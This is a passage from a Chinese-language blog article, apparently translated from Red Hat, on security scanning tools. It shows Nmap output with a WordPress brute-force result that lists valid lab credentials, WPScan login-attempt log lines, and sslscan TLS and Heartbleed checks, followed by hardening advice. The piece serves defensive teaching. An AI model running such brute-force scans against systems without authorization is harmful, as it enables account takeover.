<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">     </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.4.37</span><span class="w"> </span><span class="p">((</span><span class="nx">Red</span><span class="w"> </span><span class="nx">Hat</span><span class="w"> </span><span class="nx">Enterprise</span><span class="w"> </span><span class="nx">Linux</span><span class="p">))</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Apache</span><span class="o">/</span><span class="m m-Double">2.4.37</span><span class="w"> </span><span class="p">(</span><span class="nx">Red</span><span class="w"> </span><span class="nx">Hat</span><span class="w"> </span><span class="nx">Enterprise</span><span class="w"> </span><span class="nx">Linux</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">wordpress</span><span class="o">-</span><span class="nx">brute</span><span class="p">:</span>
<span class="o">|</span><span class="w">   </span><span class="nx">Accounts</span><span class="p">:</span>
<span class="o">|</span><span class="w">       </span><span class="nx">admin</span><span class="p">:</span><span class="nx">redhat</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Valid</span><span class="w"> </span><span class="nx">credentials</span><span class="w">              </span><span class="o">&lt;&lt;&lt;&lt;&lt;&lt;</span><span class="p">&lt;</span>
<span class="o">|</span><span class="w">       </span><span class="nx">pgervase</span><span class="p">:</span><span class="nx">redhat</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Valid</span><span class="w"> </span><span class="nx">credentials</span><span class="w">         </span><span class="o">&lt;&lt;&lt;&lt;&lt;&lt;</span><span class="p">&lt;</span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">Statistics</span><span class="p">:</span><span class="w"> </span><span class="nx">Performed</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="nx">guesses</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">seconds</span><span class="p">,</span><span class="w"> </span><span class="nx">average</span><span class="w"> </span><span class="nx">tps</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">6.0</span>
<span class="mi">111</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">rpcbind</span><span class="w"> </span><span class="mi">2</span><span class="o">-</span><span class="mi">4</span><span class="w"> </span><span class="p">(</span><span class="nx">RPC</span><span class="w"> </span><span class="err">#</span><span class="mi">100000</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">rpcinfo</span><span class="p">:</span>
<span class="o">|</span><span class="w">   </span><span class="nx">program</span><span class="w"> </span><span class="nx">version</span><span class="w">     </span><span class="nx">port</span><span class="o">/</span><span class="nx">proto</span><span class="w">  </span><span class="nx">service</span>
<span class="o">|</span><span class="w">   </span><span class="mi">100000</span><span class="w">  </span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="w">       </span><span class="mi">111</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">rpcbind</span>
<span class="o">|</span><span class="w">   </span><span class="mi">100000</span><span class="w">  </span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="w">       </span><span class="mi">111</span><span class="o">/</span><span class="nx">udp</span><span class="w">   </span><span class="nx">rpcbind</span>
<span class="o">|</span><span class="w">   </span><span class="mi">100000</span><span class="w">  </span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="w">         </span><span class="mi">111</span><span class="o">/</span><span class="nx">tcp6</span><span class="w">  </span><span class="nx">rpcbind</span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">100000</span><span class="w">  </span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="w">         </span><span class="mi">111</span><span class="o">/</span><span class="nx">udp6</span><span class="w">  </span><span class="nx">rpcbind</span>
<span class="mi">3306</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">mysql</span><span class="w">   </span><span class="nx">MySQL</span><span class="w"> </span><span class="m m-Double">5.5.5</span><span class="o">-</span><span class="m m-Double">10.3.27</span><span class="o">-</span><span class="nx">MariaDB</span>
<span class="nx">MAC</span><span class="w"> </span><span class="nx">Address</span><span class="p">:</span><span class="w"> </span><span class="mi">52</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">8</span><span class="nx">C</span><span class="p">:</span><span class="nx">A1</span><span class="p">:</span><span class="nx">C0</span><span class="w"> </span><span class="p">(</span><span class="nx">QEMU</span><span class="w"> </span><span class="kd">virtual</span><span class="w"> </span><span class="nx">NIC</span><span class="p">)</span>
<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Unix</span>

<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">7.68</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre></div>

<p>然而，运行这样的扫描可能会在目标系统上留下大量的 HTTPD 日志消息：</p>
<div class="highlight"><pre><span></span><code><span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">01</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">00</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">00</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">00</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">00</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">00</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">02</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">02</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
<span class="mf">10.19.47.170</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">[</span><span class="mf">18</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mf">2021</span><span class="p">:</span><span class="mf">20</span><span class="p">:</span><span class="mf">14</span><span class="p">:</span><span class="mf">02</span><span class="w"> </span><span class="o">-</span><span class="mf">0500</span><span class="err">]</span><span class="w"> </span><span class="s">&quot;POST /wp-login.php HTTP/1.1&quot;</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="mf">7575</span><span class="w"> </span><span class="s">&quot;http://vulnerable.usersys.redhat.com/&quot;</span><span class="w"> </span><span class="s">&quot;WPScan v3.8.10 (https://wpscan.org/)&quot;</span>
</code></pre></div>

<p>为了获得关于在最初的 Nmap 扫描中发现的 HTTPS 服务器的信息，我使用了 <code>sslscan</code> 命令：</p>
<div class="highlight"><pre><span></span><code>┌──(root?kali)-[~]
└─# sslscan vulnerable.usersys.redhat.com
Version: 2.0.6-static
OpenSSL 1.1.1i-dev  xx XXX xxxx

Connected to 10.19.47.242

Testing SSL server vulnerable.usersys.redhat.com on port 443 using SNI name vulnerable.usersys.redhat.com

  SSL/TLS Protocols:
SSLv2   disabled
SSLv3   disabled
TLSv1.0   disabled
TLSv1.1   disabled
TLSv1.2   enabled
TLSv1.3   enabled
&lt;snip&gt;
</code></pre></div>

<p>它显示了有关启用的 SSL 协议的信息，在最下方，是关于 Heartbleed 漏洞的信息：</p>
<div class="highlight"><pre><span></span><code>  Heartbleed:
TLSv1.3 not vulnerable to heartbleed
TLSv1.2 not vulnerable to heartbleed
</code></pre></div>

<h3>防御或减轻攻击的技巧</h3>
<p>有很多方法可以保护你的系统免受大量攻击。几个关键点是：</p>
<ul>
<li>**了解你的系统：**包括了解哪些端口是开放的，哪些端口应该开放，谁应该能够看到这些开放的端口，以及使用这些端口服务的预期流量是多少。Nmap 是了解网络系统的一个绝佳工具。</li>
<li><strong>使用当前的最佳实践：</strong> 现在的最佳实践可能不是未来的最佳实践。作为管理员，了解信息安全领域的最新趋势非常重要。</li>
<li><strong>知道如何使用你的产品：</strong> 例如，与其让攻击者不断攻击你的 WordPress 系统，不如阻止他们的 IP 地址并限制尝试登录的次数。在现实世界中，阻止 IP 地址可能没有那么有用，因为攻击者可能会使用受感染的系统来发起攻击。但是，这是一个很容易启用的设置，可以阻止一些攻击。</li>
<li><strong>维护和验证良好的备份：</strong> 如果攻击者攻击了一个或多个系统，能从已知的良好和干净的备份中重新构建可以节省大量时间和金钱。</li>
<li><strong>检查日志：</strong> 如上所示，扫描和渗透命令可能会留下大量日志，这表明攻击者正在攻击系统。如果你注意到它们，可以采取先发制人的行动来降低风险。</li>
<li><strong>更新系统、应用程序和任何额外的模块：</strong> 正如 <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-40r3.pdf">NIST Special Publication 800-40r3</a> 所解释的那样，“补丁通常是减轻软件缺陷漏洞最有效的方法，而且通常是唯一完全有效的解决方案。”</li>
<li><strong>使用供应商提供的工具：</strong> 供应商有不同的工具来帮助你维护他们的系统，因此一定要充分利用它们。例如，红帽企业 Linux 订阅中包含的 <a href="https://www.redhat.com/sysadmin/how-red-hat-insights">Red Hat Insights</a> 可以帮助你优化系统并提醒你注意潜在的安全威胁。</li>
</ul>
<h3>了解更多</h3>
<p>本文对安全工具及其使用方法的介绍只是冰山一角。深入了解的话，你可能需要查看以下资源：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Armitage_(computing)">Armitage</a>，一个开源的攻击管理工具</li>
<li><a href="https://access.redhat.com/security">Red Hat 产品安全中心</a></li>
<li><a href="https://www.redhat.com/en/blog/channel/security">Red Hat 安全频道</a></li>
<li><a href="https://www.nist.gov/cybersecurity">NIST 网络安全页面</a></li>
<li><a href="https://www.redhat.com/sysadmin/using-nmap-harden-systems">使用 Nmap 结果来帮助加固 Linux 系统</a></li>
</ul>
    </div><!-- /.entry-content -->

  </article>
</section>
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>links</h2>
                        <ul>
                            <li><a href="https://getpelican.com/">Pelican</a></li>
                            <li><a href="https://www.python.org/">Python.org</a></li>
                            <li><a href="https://palletsprojects.com/p/jinja/">Jinja2</a></li>
                            <li><a href="#">You can modify those links in your config file</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>

                            <li><a href="#">You can add links in your config file</a></li>
                            <li><a href="#">Another social link</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a rel="nofollow" href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a rel="nofollow" href="https://www.python.org/">Python</a>.
                </address><!-- /#about -->

                <p>The theme is by <a rel="nofollow" href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
        </footer><!-- /#contentinfo -->

</body>
</html>